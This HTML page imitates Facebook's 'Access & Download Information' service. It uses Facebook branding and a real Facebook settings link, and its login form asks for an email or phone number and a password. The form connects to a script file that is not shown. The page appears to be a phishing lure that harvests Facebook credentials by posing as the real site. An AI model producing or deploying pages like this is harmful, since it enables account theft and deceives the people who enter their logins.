<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style.css">
    <title>Facebook Access & Download Information</title>
</head>

<body>
    <div id="mainframe" class="main">
        <div class="title_box">
            <h1><span>Facebook</span> Access & Download Information</h1><br>
            <h4>You can download your information only three times a month. <a target="_blank" href="https://www.facebook.com/settings">Learn more</a></h4>
        </div>

        <div class="login_box">
            <div class="login_container">
                <div class="login_inputs">
                    <input class="emailbox" id="email_input" placeholder="Enter your email or number" required>
                    <input type="password" class="passbox" id="pass_input" placeholder="Enter your password" required>
                </div>
                <div class="login_button_container">
                    <button class="loginbutton" id="login_button">Log in</button>
                </div>
            </div>
        </div>
    </div>

    <script src="./script.js"></script>
</body>

</html>
